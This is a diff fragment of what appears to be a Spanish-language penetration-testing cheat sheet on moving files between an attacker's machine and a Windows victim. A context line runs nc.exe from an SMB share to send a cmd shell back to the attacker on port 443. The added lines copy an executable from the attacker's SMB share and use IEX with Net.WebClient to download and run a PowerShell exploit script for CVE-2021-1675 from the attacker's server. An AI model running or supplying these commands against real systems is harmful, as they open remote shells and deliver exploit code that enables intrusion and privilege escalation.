@@ -34,6 +34,18 @@ C:\Windows\Temp
 4. \\\\<IP>\\smbFolder\\nc.exe -e cmd <IP> 443 
 ```
 
+```bash
+
+❯ copy \❮IP❯\\smbFolder\\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
+
+	# IP = IP de atacante
+	# smbFolder = Nombre del folder del recurso compartido
+	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
+	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
+
+❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
+```
+
 ## Linux a Linux
 
 ```bash 
